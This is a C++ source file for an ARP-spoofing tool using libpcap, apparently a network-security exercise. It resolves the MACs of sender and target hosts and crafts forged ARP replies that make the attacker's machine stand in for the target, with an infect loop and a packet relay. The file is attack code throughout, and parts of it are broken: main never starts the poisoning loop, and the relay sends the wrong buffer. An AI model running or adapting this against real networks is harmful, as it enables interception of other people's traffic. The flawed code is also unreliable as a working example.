#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <iostream>
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
typedef struct flowset {
	EthArpPacket infect_pkt;
	Ip sender_ipaddr;
	Mac sender_macaddr;
	Ip target_ipaddr;
	Mac target_macaddr;
}flowset;

#pragma pack(pop)

using namespace std;
vector<flowset> flow;
Ip attacker_ipaddr;
Mac attacker_macaddr;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

EthArpPacket request_packet(Ip sender_ipaddr) {
	EthArpPacket packet;
	packet.eth_.smac_ = Mac(attacker_macaddr);
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_macaddr);
	packet.arp_.sip_ = htonl(Ip(attacker_ipaddr));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ipaddr);
	return packet;
}

EthArpPacket reply_packet(Ip target_ipaddr, Ip sender_ipaddr, Mac sender_macaddr) {
	EthArpPacket packet;
	packet.eth_.dmac_ = sender_macaddr;
	packet.eth_.smac_ = attacker_macaddr;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_macaddr;
	packet.arp_.sip_ = htonl(target_ipaddr);
	packet.arp_.tmac_ = sender_macaddr;
	packet.arp_.tip_ = htonl(sender_ipaddr);
	return packet;
}

int attacker_info(char* dev) {
	struct ifreq ifr;
	uint8_t ip_arr[Ip::SIZE];
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	int ret_ip = ioctl(sockfd, SIOCGIFADDR, &ifr);
	int ret_mac = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if (sockfd < 0 || ret_ip < 0 || ret_mac < 0) {
		close(sockfd);
		return -1;
	}
	memcpy(ip_arr, ifr.ifr_addr.sa_data + 2, Ip::SIZE);
	attacker_ipaddr = (ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
	uint8_t mac[Mac::SIZE];
	memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	attacker_macaddr = Mac(mac);
	close(sockfd);
	return 0;
}

int get_mac(char* dev, Ip sender_ipaddr, uint8_t* mac) { //finds out mac address
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	struct pcap_pkthdr* header;
	const u_char* packet;
	EthArpPacket req_packet = request_packet(sender_ipaddr);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
	if(res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}

	while(true) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res < 0) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}
		EthArpPacket* receive_packet = (EthArpPacket*) packet;
		memcpy(mac, &receive_packet->arp_.smac_, Mac::SIZE);
		break;
	}
	return 0;
}

int flow_init(char* dev, Ip sender_ipaddr, Ip target_ipaddr, flowset* flowstate) {
	uint8_t mac_arr[Mac::SIZE];
	int res = get_mac(dev, sender_ipaddr, mac_arr);
	if(res < 0) return -1;
	Mac sender_macaddr = Mac(mac_arr);
	res = get_mac(dev, target_ipaddr, mac_arr);
	if(res < 0) return -1;
	Mac target_macaddr = Mac(mac_arr);
	flowstate->sender_ipaddr = sender_ipaddr;
	flowstate->sender_macaddr = sender_macaddr;
	flowstate->target_ipaddr = target_ipaddr;
	flowstate->target_macaddr = target_macaddr;
	flowstate->infect_pkt = reply_packet(target_ipaddr, sender_ipaddr, sender_macaddr);
	return 0;
}

int arp_infect(pcap_t* handle) {
	while(1) {
		for(auto flowset : flow) {
			int res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&flowset.infect_pkt), sizeof(EthArpPacket));
			if(res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		sleep(1);
	}
	return 0;
}

int arp_relay(pcap_t* handle, Mac target_macaddr, const u_char* packet) {
	EthArpPacket* receiver_packet = (EthArpPacket*) packet;
	receiver_packet->eth_.smac_ = attacker_macaddr;
	receiver_packet->eth_.dmac_ = target_macaddr;
	int res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&receiver_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	if (attacker_info(dev) < 0) {
		printf("failed to get attacker's info!\n");
		return -1;
	}

	for(int i=0; i<((argc-2)/2); i++) {
		printf("------------arp_spoof #%d------------\n", i+1);
		Ip sender_ipaddr = Ip(argv[2*i+2]);
		Ip target_ipaddr = Ip(argv[2*i+3]);
		flowset flowstate;
		int res = flow_init(dev, sender_ipaddr, target_ipaddr, &flowstate);
		if (res == -1) break;
		flow.push_back(flowstate);
		cout << "sender ip : " << string(flowstate.sender_ipaddr) << ", sender mac : " << string(flowstate.sender_macaddr) << endl;
		cout << "target ip : " << string(flowstate.target_ipaddr) << ", target mac : " << string(flowstate.target_macaddr) << endl;
	}
	pcap_close(handle);
	return 0;
}
